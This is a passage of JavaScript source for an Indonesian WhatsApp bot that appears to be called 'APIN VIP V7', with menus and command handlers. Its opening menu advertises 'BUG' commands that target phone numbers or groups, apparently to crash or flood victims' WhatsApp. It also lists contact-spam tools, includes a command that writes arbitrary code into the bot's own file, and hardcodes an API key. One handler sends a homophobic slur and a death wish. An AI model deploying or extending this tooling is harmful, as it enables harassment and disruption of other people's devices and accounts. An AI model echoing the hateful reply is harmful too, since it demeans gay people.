││*BUG KONTAK*
││✑${prefix}kontak1 *628xxx*
││
││*BUG VIDEO*
││✑${prefix}video1 *628xxx*
││
││*BUG SANTET*
││✑${prefix}santet  *628xxx*
││
││*BUG IPHONE*
││✑${prefix}ipcrash  *628xxx*
││
││*BUG WAKTU*
││✑${prefix}qiogas *628xxx|waktu*
││
││*BUG JUMLAH*
││✑${prefix}gasbugqio *628xxx|jumlah*
││
││*BUG SPAM GROUP*
││✑${prefix}buttongc *link group*
││✑${prefix}gcspam *link group*
││
││*BUG KUDETA*
││✑${prefix}kudetathp1 *REPLY IMAGE*
││✑${prefix}kudetathp2
││
││*BUG PRIB*
││✑${prefix}bugvid1
││✑${prefix}bugvid2
││✑${prefix}=.
││
││*#NOTE : HABIS SEND BUG TUNGGU BOT NYA BILANG SUCCES BARU CEK TARGETNYA DI JAMIN *C1*
└─────────────────┈ ✈
 │𝙲𝚁𝙴𝙰𝚃𝙴𝙳 𝙱𝚈 : 𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈
 └─────────────────┈ ✈`)
}
break
//=================================================//
case 'infobot': {
let os = require('os')
let timestamp = speed()
let latensi = speed() - timestamp
let run = runtime(process.uptime())
ngaceng = fs.readFileSync("./qio.js").toString(),
matches = ngaceng.match(/case '[^']+'(?!.*case '[^']+')/g) || [],
caseCount = matches.length,
caseNames = matches.map(match => match.match(/case '([^']+)'/)[1]);

let totalCases = caseCount,
listCases = caseNames.join('\n${prefix} ');

m.reply(`
─✈
│ _Hi_ 👋 
└┬☄  *${m.pushName}* 
││✈  *${ucapanWaktu} @${m.sender.split("@")[0]}*☠️
│└────────────┈ ✈
└┬────────────┈ ✈
    𝙲𝚁𝙴𝙰𝚃𝙴𝙳 𝙱𝚈 : 
    𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈
┌└─────────────┈ ✈
└─ 𝘽𝙊𝙏 𝙄𝙉𝙁𝙊   
│𝐁𝐨𝐭 𝐍𝐚𝐦𝐞 : *${global.botname}*
│𝐎𝐰𝐧𝐞𝐫 𝐍𝐚𝐦𝐞 : *${global.NamaOwner}* 
│𝐕𝐞𝐫𝐬𝐢𝐨𝐧 𝐁𝐨𝐭 : *APIN VIP V7*
│𝐂𝐫𝐞𝐚𝐭𝐨𝐫 : *Alfin Faridh Taufiqiy*
│𝐒𝐩𝐞𝐞𝐝 : *${speed()} miliseconds*
│𝐑𝐮𝐧𝐭𝐢𝐦𝐞 : *${runtime(process.uptime())}*
│𝐏𝐫𝐞𝐟𝐢𝐱 :  *No-Prefix*
│𝐌𝐨𝐝𝐞 : *Private-Bot*
│𝐑𝐮𝐧𝐧𝐢𝐧𝐠 : *Panel Only*
│𝐋𝐢𝐛𝐫𝐚𝐫𝐲 : *Baileys-Ws*   
│
└─ 𝙐𝙎𝙀𝙍 𝙄𝙉𝙁𝙊 
│𝐍𝐚𝐦𝐞 : *${m.pushName}*
│𝐏𝐫𝐞𝐦𝐢𝐮𝐦 : *${isPrem ? '✅' : `❌`}*
│
└─ 𝙏𝙄𝙈𝙀 𝙄𝙉𝙁𝙊 
│𝐓𝐢𝐦𝐞 : *${time}*
│𝐖𝐞𝐞𝐤 : *${week}*
└─────────────┈ ✈
┌└─────────────┈ ✈

# Total case: ${totalCases}\n\n${prefix} ${totalCases > 0 ? listCases : "No cases found."}

`)
}
break





//=================================================//




case 'allmenu': {
await loading()
m.reply(`─✈
│ _Hi_ 👋 
└┬☄  *${m.pushName}* 
││✈  *${ucapanWaktu} @${m.sender.split("@")[0]}*☠️
│└────────────┈ ✈
└┬────────────┈ ✈
    𝙲𝚁𝙴𝙰𝚃𝙴𝙳 𝙱𝚈 : 
    𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈
┌└─────────────┈ ✈
└─ 𝘽𝙊𝙏 𝙄𝙉𝙁𝙊   
│𝐁𝐨𝐭 𝐍𝐚𝐦𝐞 : *${global.botname}*
│𝐎𝐰𝐧𝐞𝐫 𝐍𝐚𝐦𝐞 : *${global.NamaOwner}* 
│𝐕𝐞𝐫𝐬𝐢𝐨𝐧 𝐁𝐨𝐭 : *APIN VIP V7*
│𝐂𝐫𝐞𝐚𝐭𝐨𝐫 : *Alfin Faridh Taufiqiy*
│𝐒𝐩𝐞𝐞𝐝 : *${speed()} miliseconds*
│𝐑𝐮𝐧𝐭𝐢𝐦𝐞 : *${runtime(process.uptime())}*
│𝐏𝐫𝐞𝐟𝐢𝐱 :  *No-Prefix*
│𝐌𝐨𝐝𝐞 : *Private-Bot*
│𝐑𝐮𝐧𝐧𝐢𝐧𝐠 : *Panel Only*
│𝐋𝐢𝐛𝐫𝐚𝐫𝐲 : *Baileys-Ws*   
│
└─ 𝙐𝙎𝙀𝙍 𝙄𝙉𝙁𝙊 
│𝐍𝐚𝐦𝐞 : *${m.pushName}*
│𝐏𝐫𝐞𝐦𝐢𝐮𝐦 : *${isPrem ? '✅' : `❌`}*
│
└─ 𝙏𝙄𝙈𝙀 𝙄𝙉𝙁𝙊 
│𝐓𝐢𝐦𝐞 : *${time}*
│𝐖𝐞𝐞𝐤 : *${week}*
└─────────────┈ ✈
┌└─────────────┈ ✈
*FITUR BOT*
││✑${prefix}self
││✑${prefix}public
││✑${prefix}setppbot
└─────────────┈ ✈
││*LIST FITUR ASUPAN*
││✑${prefix}tiktokgirl 
││✑${prefix}tiktoknukthy 
││✑${prefix}tiktokkayes
││✑${prefix}tiktokpanrika
││✑${prefix}tiktoknotnot
││✑${prefix}tiktokghea
││✑${prefix}tiktoksantuy
││✑${prefix}paptt *foto/video*
└─────────────┈ ✈
││*LIST FITUR OWNER*
││✑${prefix}addowner *6288xxx*
││✑${prefix}delowner *628xxx*
││✑${prefix}addprem *6288xxx*
││✑${prefix}delprem *628xxx*
││✑${prefix}aksesmurbug *6288xxx/tag*
││✑${prefix}delaksesmurbug *6288xxx/tag*
││✑${prefix}addseller *6288xxx*
││✑${prefix}delseller *6288xxx*
││✑${prefix}addzxcwords *kata kasar*
││✑${prefix}delzxcwords *kata kasar*
││✑${prefix}changemenu *button/non*
││✑${prefix}autoread *on/off*
││✑${prefix}autotyping *on/off*
││✑${prefix}autorecord *on/off*
││✑${prefix}autobio *on/off*
││✑${prefix}self
││✑${prefix}public
││✑${prefix}shutdown
││✑${prefix}addcase 
││✑${prefix}delcase
││✑${prefix}join *link group*
││✑${prefix}block *nomor*
││✑${prefix}unblock *nomor*
││✑${prefix}listblock
││✑${prefix}setppbot *reply gambar*
││✑${prefix}setbiobot *teks*
││✑${prefix}listpc
└─────────────┈ ✈
││*LIST FITUR GAME*
││✑${prefix}cekkhodamcore *nama*
││✑${prefix}cekkhodam *namq*
││✑${prefix}cekjodoh *nama*
││✑${prefix}cekkuota *nama*
││✑${prefix}tictactoe
││✑${prefix}suitpvp
││✑${prefix}kuismath
││✑${prefix}tebak *gambar*
││✑${prefix}tebak *kata*
││✑${prefix}tebak *kalimat*
││✑${prefix}tebak *lirik*
││✑${prefix}tebak *tebakan*
││✑${prefix}tebak *bendera*
││✑${prefix}tebak *bendera2*
││✑${prefix}tebak *kabupaten*
││✑${prefix}tebak *kimia*
││✑${prefix}tebak *asahotak*
││✑${prefix}tebak *siapakahaku*
││✑${prefix}tebak *susunkata*
││✑${prefix}tebak *tekateki*
││✑${prefix}kerja 
││✑${prefix}bankcek 
││✑${prefix}maling 
││✑${prefix}banknabung 
││✑${prefix}banktarik 
││✑${prefix}berkebon 
││✑${prefix}crafting 
││✑${prefix}bet 
││✑${prefix}bonus 
││✑${prefix}buah 
││✑${prefix}nebang 
││✑${prefix}bekerja 
││✑${prefix}bansos 
││✑${prefix}taxy 
││✑${prefix}mulung 
││✑${prefix}berburu 
││✑${prefix}polisi 
││✑${prefix}berdagang 
││✑${prefix}rampok 
││✑${prefix}bunuh 
││✑${prefix}collect 
││✑${prefix}mancing 
││✑${prefix}repair 
││✑${prefix}feed 
││✑${prefix}fight 
││✑${prefix}gajian 
││✑${prefix}upgrade 
││✑${prefix}transfer 
││✑${prefix}shop 
││✑${prefix}selectskill 
││✑${prefix}sampah 
││✑${prefix}roket 
││✑${prefix}ojek 
││✑${prefix}nguli 
││✑${prefix}pasar 
││✑${prefix}rob 
││✑${prefix}referal 
││✑${prefix}petshop 
││✑${prefix}kolam 
││✑${prefix}koboy 
││✑${prefix}leaderboard 
││✑${prefix}Nomorhoki
││✑${prefix}Artimimpi
││✑${prefix}Artinama
││✑${prefix}Ramaljodoh
││✑${prefix}Ramalcinta
││✑${prefix}Ramaljodohbali
││✑${prefix}Suamiistri
││✑${prefix}Cocoknama
││✑${prefix}Pasangan
││✑${prefix}Jadiannikah
││✑${prefix}Sifatusaha
││✑${prefix}Rezeki
││✑${prefix}Pekerjaan
││✑${prefix}Nasib
││✑${prefix}Penyakit
││✑${prefix}Tarot
││✑${prefix}Fengshui
││✑${prefix}Haribaik
││✑${prefix}Harisangar
││✑${prefix}Harisial
││✑${prefix}Nagahari
││✑${prefix}Arahrezeki
││✑${prefix}Peruntungan
││✑${prefix}Weton
││✑${prefix}Karakter
││✑${prefix}Keberuntungan
││✑${prefix}Masasubur
││✑${prefix}Memancing
││✑${prefix}Zodiak
││✑${prefix}Shio
└─────────────┈ ✈
││*LIST FITUR STICKER*
││✑${prefix}toimg *reply stiker*
││✑${prefix}toaudio *reply video*
││✑${prefix}sticker *reply gambar*
││✑${prefix}s *reply gambar *
││✑${prefix}smeme *teks bawah|teks atas*
││✑${prefix}kalkulator 
││✑${prefix}removebg *reply gambar*
││✑${prefix}wm *reply stiker*
││✑${prefix}attp *teks
││✑${prefix}styletext *teks*
└─────────────┈ ✈
││*LIST FITUR OPENAI*
││✑${prefix}dall-e Ilustrasi 
││✑${prefix}stablediffusion ilustrasi
└─────────────┈ ✈
││*LIST FITUR JELAJAH*
││✑${prefix}google-article *query*
││✑${prefix}google-search *query*
││✑${prefix}search-kbbi *query*
││✑${prefix}search-apk *query*
││✑${prefix}search-resep
││✑${prefix}search-sticker
└─────────────┈ ✈
││*LIST FITUR SUARA*
││✑${prefix}Bass *ReplyAudio*
││✑${prefix}Blown *ReplyAudio*
││✑${prefix}Deep *ReplyAudio*
││✑${prefix}Earrape *ReplyAudio*
││✑${prefix}Fast *ReplyAudio*
││✑${prefix}Fat *ReplyAudio*
││✑${prefix}Nightcore *ReplyAudio*
││✑${prefix}Reverse *ReplyAudio*
││✑${prefix}Robot *ReplyAudio*
││✑${prefix}Slow *ReplyAudio*
││✑${prefix}Tupai *ReplyAudio*
└─────────────┈ ✈
││*LIST FITIR ISLAM🕌*
││✑${prefix}kisahnabi
││✑${prefix}asmaulhusna
││✑${prefix}bacaansholat
││✑${prefix}ayatkursi
││✑${prefix}doaharian
││✑${prefix}niatsholat
││✑${prefix}quotesislami
││✑${prefix}doatahlil
└─────────────┈ ✈
││*LIST FITUR GRUP*
││✑${prefix}setppgroup reply gambar
││✑${prefix}promote tag
││✑${prefix}demote tag
││✑${prefix}kick tag
││✑${prefix}add nomor
││✑${prefix}editgroup open/close
││✑${prefix}editsubjek teks 
││✑${prefix}editinfo teks
││✑${prefix}editdesk teks
││✑${prefix}clearchat
││✑${prefix}resetlinkgc
││✑${prefix}revoke
││✑${prefix}infogc
││✑${prefix}getppgc
││✑${prefix}closegroup
││✑${prefix}opengroup
││✑${prefix}hidetag
││✑${prefix}tagsubject
││✑${prefix}tagall
││✑${prefix}linkgc
││✑${prefix}antitoxic *on / off*
││✑${prefix}antiasing *on / off*
││✑${prefix}antivirtex *on / off*
││✑${prefix}antilinkall *on / off*
││✑${prefix}antilinkfb *on / off*
││✑${prefix}antilinkyt *on / off*
││✑${prefix}antilinkytch *on / off*
││✑${prefix}antilinkig *on / off*
││✑${prefix}antilinktele *on / off*
││✑${prefix}antilinktiktok *on / off*
││✑${prefix}antilinktwitter *on / off*
││✑${prefix}antilink *on / off*
││✑${prefix}cekidgc *link gc*
└─────────────┈ ✈
││*LIST FITUR DOWNLOAD*
││✑${prefix}gitclone *url*
││✑${prefix}mediafire *url*
││✑${prefix}tiktokmp3 *url*
││✑${prefix}tiktokvideo *url*
││✑${prefix}ytmp4 *url*
││✑${prefix}ytmp3 *url*
││✑${prefix}play *judul*
││✑${prefix}playmusic *judul*
││✑${prefix}douyindl *url*
││✑${prefix}igdlimage *url*
││✑${prefix}igdlmp4 *url*
││✑${prefix}pintmp4 *url*
││✑${prefix}happymod *nama apk*
└─────────────┈ ✈
││*LIST FITUR FUN*
││✑${prefix}apakah
││✑${prefix}bisakah
││✑${prefix}bagaimanakah
││✑${prefix}gantengcek
││✑${prefix}cekganteng
││✑${prefix}cantikcek
││✑${prefix}cekcantik
││✑${prefix}sangecek
││✑${prefix}ceksange
││✑${prefix}gaycek
││✑${prefix}cekgay
││✑${prefix}lesbicek
││✑${prefix}ceklesbi
││✑${prefix}kapankah
││✑${prefix}wangy
││✑${prefix}cekmati
└─────────────┈ ✈
││*LIST FITUR FOTONAMA*
││✑${prefix}shadow *namalu* 
││✑${prefix}write *namalu* 
││✑${prefix}romantic *namalu* 
││✑${prefix}burnpaper *namalu*
││✑${prefix}smoke *namalu* 
││✑${prefix}narutobanner *namalu* 
││✑${prefix}love *namalu* 
││✑${prefix}undergrass *namalu*
││✑${prefix}doublelove *namalu* 
││✑${prefix}coffecup *namalu*
││✑${prefix}underwaterocean *namalu*
││✑${prefix}smokyneon *namalu*
││✑${prefix}starstext *namalu*
││✑${prefix}rainboweffect *namalu*
││✑${prefix}balloontext *namalu*
││✑${prefix}metalliceffect *namalu*
││✑${prefix}embroiderytext *namalu*
││✑${prefix}flamingtext *namalu*
││✑${prefix}stonetext *namalu*
││✑${prefix}writeart *namalu*
││✑${prefix}summertext *namalu*
││✑${prefix}wolfmetaltext *namalu*
││✑${prefix}nature3dtext *namalu*
││✑${prefix}rosestext *namalu*
││✑${prefix}naturetypography *namalu*
││✑${prefix}quotesunder *namalu*
││✑${prefix}shinetext *namalu*
││✑${prefix}glitchtext *namalu*
││✑${prefix}writetext *namalu*
││✑${prefix}advancedglow *namalu*
││✑${prefix}typographytext *namalu*
││✑${prefix}pixelglitch *namalu*
││✑${prefix}neonglitch *namalu*
││✑${prefix}flagtext *namalu*
││✑${prefix}flag3dtext *namalu*
││✑${prefix}deletingtext *namalu*
││✑${prefix}blackpinkstyle *namalu*
││✑${prefix}glowingtext *namalu*
││✑${prefix}underwatertext *namalu*
││✑${prefix}logomaker *namalu*
││✑${prefix}cartoonstyle *namalu*
││✑${prefix}papercutstyle *namalu*
││✑${prefix}watercolortext *namalu*
││✑${prefix}effectclouds *namalu*
││✑${prefix}blackpinklogo *namalu*
││✑${prefix}gradienttext *namalu*
││✑${prefix}summerbeach *namalu*
││✑${prefix}luxurygold *namalu*
││✑${prefix}multicoloredneon *namalu*
││✑${prefix}sandsummer *namalu*
││✑${prefix}galaxywallpaper *namalu*
││✑${prefix}1917style *namalu*
││✑${prefix}makingneon *namalu*
││✑${prefix}royaltext *namalu*
││✑${prefix}freecreate *namalu*
││✑${prefix}galaxystyle *namalu*
││✑${prefix}lighteffects *namalu*
└─────────────┈ ✈
││*LIST FITUR PANEL*
││✑${prefix}delsrv *id server*
││✑${prefix}delusr
││✑${prefix}addsrv *nama,tanggal,ram,15,1,0/0,0*
││✑${prefix}listram
││✑${prefix}listsrv
││✑${prefix}listusr
└─────────────┈ ✈
││*LIST FITUR FUN*
││✑${prefix}akira
││✑${prefix}akiyama
││✑${prefix}ana
││✑${prefix}asuna
││✑${prefix}ayuzawa
││✑${prefix}boruto
││✑${prefix}chitoge
││✑${prefix}deidara
││✑${prefix}doraemon
││✑${prefix}elaina
││✑${prefix}emilia
││✑${prefix}erza
││✑${prefix}gremory
││✑${prefix}hestia
││✑${prefix}hinata
││✑${prefix}inori
││✑${prefix}isuzu
││✑${prefix}itachi
││✑${prefix}itori
││✑${prefix}kaga
││✑${prefix}kagura
││✑${prefix}kakasih
││✑${prefix}kaori
││✑${prefix}keneki
││✑${prefix}kotori
││✑${prefix}kurumi
││✑${prefix}madara
││✑${prefix}mikasa
││✑${prefix}miku
││✑${prefix}minato
││✑${prefix}naruto
││✑${prefix}nezuko
││✑${prefix}onepiece
││✑${prefix}pokemon
││✑${prefix}rize
││✑${prefix}sagiri
││✑${prefix}sakura
││✑${prefix}sasuke
││✑${prefix}shina
││✑${prefix}shinka
││✑${prefix}shizuka
││✑${prefix}shota
││✑${prefix}toukachan
││✑${prefix}tsunade
││✑${prefix}yukiyuki
└─────────────┈ ✈
││*LIST FITUR JEBE*
││✑${prefix}pushkontakidgc idgc|teksny
││✑${prefix}pushkontakv1 idgc|teksnya
││✑${prefix}pushkontakv2 teks
││✑${prefix}pushkontakv3 replyimg|teks
││✑${prefix}savecontact idgc
││✑${prefix}jpm replyimg|teks
││✑${prefix}store
││✑${prefix}payment
││✑${prefix}addlist
││✑${prefix}dellist
││✑${prefix}updatelist
││✑${prefix}proses *reply/pesan*
││✑${prefix}done *reply/pesan*
└─────────────┈ ✈
││*LIST FITUR TEXT*
││✑${prefix}txtban
││✑${prefix}txtunbanperma
││✑${prefix}txtunbansetpp
││✑${prefix}txtunbanspam
││✑${prefix}txtunbantinjau
└─────────────────┈ ✈
 │𝙲𝚁𝙴𝙰𝚃𝙴𝙳 𝙱𝚈 : 𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈
 └─────────────────┈ ✈`)
}
break
//=================================================//
case 'ambilq': {
let jsonData = JSON.stringify({ [m.quoted.mtype]: m.quoted }, null, 2);
fs.writeFileSync('pukimak.json', jsonData);
qioreply(jsonData)
}
break
//=================================================//
case 'sc': case 'script': {
m.reply(`Sc Ini Dibuat Oleh Alfin Faridh Taufiqiy.


🔏Created : Alfin Faridh Taufiqiy
🔏Base : Alfin Faridh Taufiqiy

❕Youtube : ${global.yt}
❗Telwgram : t.me/apintrava

`)
}
break
//=================================================//
case 'owner': case 'botowner':
let namaown = `Owner Cakep`
var contact = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"contactMessage": {
"displayName": `${namaown}`,
"vcard": `BEGIN:VCARD\nVERSION:3.0\nN:;;;;\nFN:${namaown}\nitem1.TEL;waid=${global.ownMain}:+${global.ownMain}\nitem1.X-ABLabel:Ponsel\nX-WA-BIZ-DESCRIPTION:[[ ༑ Alwaysaqio Robot ༑ ]]\nX-WA-BIZ-NAME: [[ ༑ Alwaysaqio Robot ༑ ]]\nEND:VCARD`,
}
}), { userJid: m.chat, quoted: m })
qio.relayMessage(m.chat, contact.message, { messageId: contact.key.id })
break
//=================================================//
case 'assalamualaikum': {
qio.sendMessage(m.chat, { text: `waalaikumsalam`}, { quoted: m })
}
break
//=================================================//
case 'woi': case 'deck': case 'dick': case 'dek': case 'bocil': case 'esempe': case 'cil': case 'cill': case 'p': {
m.reply(`Harap yang sopan dalam memanggil orang, minimal mengatakan "Assalamu'alaikum warrahmatullahi Wabarakatuh" atau kalian bisa panggil Namanya. Tidak sopan itu, Jika *anda lebih tua* anda mengerti yang namanya etika.

islam: Assalamualaikum
kristen: Shalom
hindu: Swastyastu
buddha: Sotthi Jitu
konghucu: Wei De Dong Tian
Atheis/Gapunya Agama/Orang Gila: ${command}`)
}
break


case 'bug': case 'apa': case 'kenapa': case 'oke': case 'apa': case 'virtex': case 'virteks': case 'virtext': case 'pirtek': case 'pirteks': case 'pirtex': case 'anjay':{
qio.sendMessage(m.chat, { text: `kenapa bre?`}, { quoted: m })
}
break

case 'shutdown': {
if (!isPrem) return qioreply(mess.prem)
m.reply(`Otsukaresama deshita🖐`)
await sleep(5000)
process.exit()
}
break
//=================================================//
case "totalcase": {
//inireact();
if (!isPrem) return qioreply(mess.prem);
ngaceng = fs.readFileSync("./qio.js").toString(),
matches = ngaceng.match(/case '[^']+'(?!.*case '[^']+')/g) || [],
caseCount = matches.length,
caseNames = matches.map(match => match.match(/case '([^']+)'/)[1]);

let totalCases = caseCount,
listCases = caseNames.join('\n• ');

m.reply(`Total case: ${totalCases}\n\n• ${totalCases > 0 ? listCases : "No cases found."}`);
}
break
//=================================================//
case "getname": {
if (q) {
try {
var name = d4tbs.users[q].name
} catch {
var name = await qio.getName(q)
}
qioreply(name)
} else {
qioreply(m.pushName)
}
}
break
//=================================================//
case "getpp": {
if (Input) {
try {
var ppWong = await qio.profilePictureUrl(Input, "image")
} catch {
var ppWong = "https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60"
}
qio.sendMessage(m.chat, { image: { url: ppWong }}, { quoted: m })
} else {
try {
var ppWong = await qio.profilePictureUrl(m.sender, "image")
} catch {
var ppWong = "https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60"
}
qio.sendMessage(m.chat, { image: { url: ppWong }}, { quoted: m })
}
}
break
//=================================================//
case 'changemenu':
if (!isPrem) return qioreply(mess.prem)
if (args.length < 1) return m.reply(`Example ${prefix + command} button/non`)
if (q == 'button') {
db.data.settings[botNumber].menuType = 'buttonImage'
m.reply(`Successfully Changed Menu To Button List Image`)
} else if (q == 'non') {
db.data.settings[botNumber].menuType = 'externalImage'
m.reply(`Successfully Changed Auto Typing To External Image`)
}
break
//=================================================//
case 'autorecord':
if (!isPrem) return qioreply(mess.prem)
if (args.length < 1) return m.reply(`Example ${prefix + command} on/off`)
if (q == 'on') {
db.data.settings[botNumber].autoRecord = true
m.reply(`Successfully Changed Auto Record To ${q}`)
} else if (q == 'off') {
db.data.settings[botNumber].autoRecord = false
m.reply(`Successfully Changed Auto Record To ${q}`)
}
break;
//=================================================//
case 'autoread':
if (!isPrem) return qioreply(mess.prem)
if (args.length < 1) return m.reply(`Example ${prefix + command} on/off`)
if (q == 'on') {
db.data.settings[botNumber].autoread = true
m.reply(`Successfully Changed Auto Read To ${q}`)
} else if (q == 'off') {
db.data.settings[botNumber].autoread = false
m.reply(`Successfully Changed Auto Read To ${q}`)
}
break
//=================================================//
case 'autotyping':
if (!isPrem) return qioreply(mess.prem)
if (args.length < 1) return m.reply(`Example ${prefix + command} on/off`)
if (q == 'on') {
db.data.settings[botNumber].autoTyping = true
m.reply(`Successfully Changed Auto Typing To ${q}`)
} else if (q == 'off') {
db.data.settings[botNumber].autoTyping = false
m.reply(`Successfully Changed Auto Typing To ${q}`)
}
break
//=================================================//
case 'autobio':
if (!isPrem) return qioreply(mess.prem)
if (args.length < 1) return m.reply(`Example ${prefix + command} on/off`)
if (q == 'on') {
db.data.settings[botNumber].autobio = true
m.reply(`Successfully Changed Auto Bio To ${q}`)
} else if (q == 'off') {
db.data.settings[botNumber].autobio = false
m.reply(`Successfully Changed Auto Bio To ${q}`)
}
break
//=================================================//
case 'onlygroup':
case 'onlygc':
if (!isPrem) return qioreply(mess.prem)
if (args.length < 1) return m.reply(`Example ${prefix + command} on/off`)
if (q == 'on') {
db.data.settings[botNumber].onlygrub = true
m.reply(`Successfully Changed Onlygroup To ${q}`)
} else if (q == 'off') {
db.data.settings[botNumber].onlygrub = false
m.reply(`Successfully Changed Onlygroup To ${q}`)
}
break
//=================================================//
case 'join': {
if (!isPrem) return qioreply(mess.prem)
if (!text) return qioreply('Masukkan Link Group!')
if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return 'Link Invalid!'
qioreply(mess.wait)
let result = args[0].split('https://chat.whatsapp.com/')[1]
await qio.groupAcceptInvite(result).then((res) => qioreply(jsonformat(res))).catch((err) => qioreply(jsonformat(err)))
}
break
//=================================================//
case 'self': {
if (!isPrem) return qioreply(mess.prem)
qio.public = false
qioreply('succes')
}
break
//=================================================//
case 'block':
if (!isPrem) return qioreply(mess.prem);
if(isGroup){
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if(users){
await qio.updateBlockStatus(users, "block")
m.reply(`Sukses block user`)
} else {
qioreply("Silakan reply pesan atau tag atau input nomer yang mau di block")
}
} else if(!isGroup){
if(q){
var woke = q.replace(new RegExp("[()+-/ +/]", "gi"), "") + `@s.whatsapp.net`
if(woke.startsWith("08")) return qioreply("Awali nomer dengan 62")
if(!woke.startsWith("62")) return qioreply("Silakan reply pesan atau tag atau input nomer yang mau di block")
await qio.updateBlockStatus(woke, "block")
} else if(!q){
qioreply("Masukan nomer yang ingin di block")
}
m.reply(`Berhasil Block user ${woke.split("@")[0]}`)
}
break
//=================================================//
case 'unblock':
if (!isPrem) return qioreply(mess.prem);
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if(isGroup){
if(users){
await qio.updateBlockStatus(users, "unblock")
await m.reply(`Sukses unblock user`)
} else if(!q){
qioreply("Silakan reply pesan atau tag atau input nomer yang mau di block")
}
} else if(!isGroup){
if(q){
let woke = q.replace(new RegExp("[()+-/ +/]", "gi"), "") + `@s.whatsapp.net`
if(woke.startsWith("08")) return qioreply("Awali nomer dengan 62")
if(!woke.startsWith("62")) return qioreply("Silakan reply pesan atau tag atau input nomer yang mau di block")
await qio.updateBlockStatus(woke, "unblock")
m.reply(`Sukses unblock ${woke}`)
} else if(!q){
qioreply("Masukan nomer yang ingin di unblock")
}

}
break
//=================================================//
case 'listblock':{
let block = await qio.fetchBlocklist()
qioreply('List Block :\n\n' + `Total : ${block == undefined ? '*0* Diblokir' : '*' + block.length + '* Diblokir'}\n` + block.map(v => '• ' + v.replace(/@.+/, '')).join`\n`)
}
break
//=================================================//
case 'setppbot':{
if (!isPrem) return qioreply(mess.prem);
if(m.quoted){
const media = await qio.downloadAndSaveMediaMessage(quoted)
const { img } = await generateProfilePicture(media)
await qio.query({ tag: 'iq',  attrs: { to: botNumber, type:'set', xmlns: 'w:profile:picture'}, content: [{ tag: 'picture', attrs: { type: 'image' }, content: img }]})   
await m.reply(`${mess.success}`)
} else qioreply("Reply fotonya")
}
break
//=================================================//
case 'delppbot': {
if (!isPrem) return qioreply(mess.prem);
qio.removeProfilePicture(qio.user.id)
qioreply(mess.succes)
}
break
//=================================================//
case 'setbiobot':{
if (!isPrem) return qioreply(mess.prem);
if (!q) return m.reply(`Kirim perintah ${prefix+command} nama\n\nContoh : ${command} Paijo`)
await qio.updateProfileStatus(q)
await m.reply(`Berhasil mengganti status bio ke *${q}*`)
}
break
//=================================================//
case 'listpc': {
if (!isPrem) return qioreply(mess.prem);
let anulistp = await store.chats.all().filter(v => v.id.endsWith('.net')).map(v => v.id)
let teks = `*Private Chat*\nTotal: ${anulistp.length} Chat\n\n`
for (let i of anulistp) {
let nama = store.messages[i].array[0].pushName
teks += `*Name :* ${pushname}\n*User :* @${sender.split('@')[0]}\n*Chat :* https://wa.me/${sender.split('@')[0]}\n\n───────────\n\n`
}
qioreply(teks)
}
break
//=================================================//
case "addcase": {
if (!isPrem) return qioreply(mess.prem);
if (!q) return m.reply(`Masukan Input`);
if (!q.includes("|")) return qioreply("Format perintah tidak valid. Gunakan: addcase <tempat>|case \"casenya\">{ ... } break")

let tempat = q.split("|")[0];
let casenya = q.split("|")[1];
let newCase = casenya

let fileContent = fs.readFileSync("./qio.js", "utf-8");

let breakIndex = fileContent.indexOf(`break\n`, fileContent.indexOf(`case "${tempat}":`));

if (breakIndex !== -1) {
fileContent = fileContent.slice(0, breakIndex + 6) + newCase + fileContent.slice(breakIndex + 6);

fs.writeFileSync("./qio.js", fileContent, "utf-8");

m.reply(`Case baru "${casenya}" berhasil ditambahkan di bawah case "${tempat}"!`);
} else {
m.reply(`Tidak dapat menemukan break di case "${tempat}".`);
}
}
break
//=================================================//
case "delcase": {
if (!isPrem) return qioreply(mess.prem);
if (!q) return qioreply("Masukkan nama case yang ingin dihapus, contoh: delcase gpt4");

let caseName = q

let fileContent = fs.readFileSync("./qio.js", "utf-8");

let startIndex = fileContent.indexOf(`case "${caseName}"`);
let endIndex = fileContent.indexOf("break", startIndex);

if (startIndex !== -1 && endIndex !== -1) {
let caseToDelete = fileContent.slice(startIndex, endIndex + 6);
fileContent = fileContent.replace(caseToDelete, "");

fs.writeFileSync("./qio.js", fileContent, "utf-8");

m.reply(`Case "${caseName}" berhasil dihapus!`);
} else {
m.reply(`Tidak dapat menemukan case "${caseName}" untuk dihapus.`);
}
}
break
//=================================================//
case 'iniqio' : {
qio.sendMessage(m.chat, { text: `_qio itu ganteng banget, aku jdi suka ama dia 😣😖😫_` }, { quoted: m })
}
break
//=================================================//
case 'terkentod' : {
qio.sendMessage(m.chat, { text: `Hoekkkkkkk🤮🤮🤮. najis ada gay, mati aja lu kontol🤢` }, { quoted: m })
}
break
//=================================================//
case "emojimix": {
let [emoji1, emoji2] = text.split`+`
if (!emoji1) return m.reply(`*Example: ${prefix+command} 😅 + 🤔*`)
if (!emoji2) return m.reply(`*Example: ${prefix+command} 😅 + 🤔*`)
let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`)
for (let res of anu.results) {
let encmedia = await qio.sendImageAsSticker(m.chat, res.url, m, { packname: global.packname, author: global.author, categories: res.tags })
await fs.unlinkSync(encmedia)
}
}
break
//=================================================//
case "emojimix2": {
if (!text) return m.reply(`*Example: ${prefix+command} 😅*`)
